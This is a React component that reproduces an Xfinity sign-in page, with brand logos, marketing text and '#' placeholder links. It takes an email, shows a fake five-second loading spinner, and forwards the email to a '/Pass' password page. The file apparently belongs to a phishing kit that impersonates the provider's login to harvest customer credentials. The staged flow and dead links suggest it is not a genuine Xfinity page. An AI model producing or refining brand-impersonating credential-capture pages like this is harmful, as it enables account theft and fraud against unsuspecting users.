import React, { useState } from 'react';
import Xfinity from '../assets/Xfinity.png';
import logo from '../assets/logo.png'
import bottom from '../assets/bottom.png'
import { useNavigate } from 'react-router-dom';

const LoginPage = () => {
  const navigate = useNavigate(); // Initialize the navigate function
  const [email, setEmail] = useState(''); // State to hold the email input
  const [isLoading, setIsLoading] = useState(false); // State to track the loading status

  const handleEmailChange = (e) => {
    setEmail(e.target.value); // Update the email state
  };

  const handleButtonClick = () => {
    if (!email) {
      alert('Please enter your email');
      return; // Exit if email is not provided
    }

    // Start loading effect
    setIsLoading(true);

    // Delay navigation by 5 seconds (5000 ms)
    setTimeout(() => {
      setIsLoading(false); // Stop the loading effect
      navigate('/Pass', { state: { email } }); // Navigate to the password page after the delay
    }, 5000); // 5-second delay
  };

  return (
    <div className="flex flex-col md:flex-row h-screen">
      {/* Left section */}
      <div className="flex flex-col bg-white w-full md:w-1/2 px-6 sm:px-10 md:px-32 py-10 sm:py-14 md:py-28">
        {/* Logo */}
        <img src={logo} alt="xfinity" className="w-16 sm:w-20 md:w-24 mb-6" />

        {/* Sign-in form */}
        <h1 className="text-xl sm:text-2xl md:text-3xl font-bold mb-4">
          Sign in with your Xfinity ID
        </h1>
        <form className="flex flex-col">
          <input
            type="text"
            placeholder="Email, mobile, or username"
            value={email} // Bind the input value to the email state
            onChange={handleEmailChange} // Handle email change
            className="border border-gray-300 rounded-lg p-3 w-full mb-4 focus:outline-none focus:ring-2 focus:ring-purple-600"
          />
        </form>

        <p className="text-sm sm:text-base text-gray-500 mb-4">
          By signing in, you agree to our{' '}
          <a href="#" className="text-purple-600">
            Terms of Service
          </a>{' '}
          and{' '}
          <a href="#" className="text-purple-600">
            Privacy Policy
          </a>.
        </p>

        {/* Button with loader effect */}
        <button
          onClick={handleButtonClick}
          className="bg-[#5a23b9] text-white py-4 px-2 rounded-md hover:bg-[#411987] mb-4 w-full sm:w-28"
          disabled={isLoading} // Disable button while loading
        >
          {isLoading ? (
            // Loader (Spinner) during loading
            <div className="flex justify-center items-center">
              <svg
                className="animate-spin h-5 w-5 text-white"
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                viewBox="0 0 24 24"
              >
                <circle
                  className="opacity-25"
                  cx="12"
                  cy="12"
                  r="10"
                  stroke="currentColor"
                  strokeWidth="4"
                ></circle>
                <path
                  className="opacity-75"
                  fill="currentColor"
                  d="M4 12a8 8 0 018-8v8H4z"
                ></path>
              </svg>
            </div>
          ) : (
            "Let's go" // Original button text when not loading
          )}
        </button>

        {/* Additional links */}
        <div className="flex flex-col gap-4 text-sm sm:text-base text-black py-8 sm:py-14">
          <div className="border-b border-black md:w-[400px] py-4 bg-transparent hover:bg-gray-100 cursor-pointer">
            <p className="md:px-2 text-[16px]">
              New to Xfinity?{' '}
              <a href="#" className="text-black">
                View exclusive offers near you
              </a>
            </p>
          </div>

          <div className="border-b border-black md:w-[400px] py-4 bg-transparent hover:bg-gray-100 cursor-pointer text-[16px] relative">
            <a href="#" className="text-black px-2">
              Find your Xfinity ID
            </a>
          </div>

          <div className="border-b border-black md:w-[400px] py-4 bg-transparent hover:bg-gray-100 cursor-pointer text-[16px] relative">
            <a href="#" className="text-black px-2">
              Create a new Xfinity ID
            </a>
          </div>
        </div>
      </div>

      {/* Right section */}
      <div className="text-white w-full md:w-1/2 flex flex-col justify-center items-center p-8 relative">
        <h2 className="text-2xl sm:text-3xl font-bold mb-4">Xfinity Mobile</h2>
        <p className="text-lg sm:text-xl mb-6">The ultimate mobile network</p>
        <p className="text-sm sm:text-base mb-6 max-w-md text-center">
          With up to gig-speed WiFi in millions of locations nationwide,
          only Xfinity Mobile gives you the ultimate connection.
        </p>
        <img
          src={Xfinity}
          alt="Xfinity Mobile Devices"
          className="h-40 md:h-screen absolute object-contain right-0 hidden md:block"
        />
        <img
          src={bottom}
          alt=""
          className="w-40 md:w-[629.5px] absolute bottom-0 object-contain right-0 hidden md:block"
        />
      </div>
    </div>
  );
};

export default LoginPage;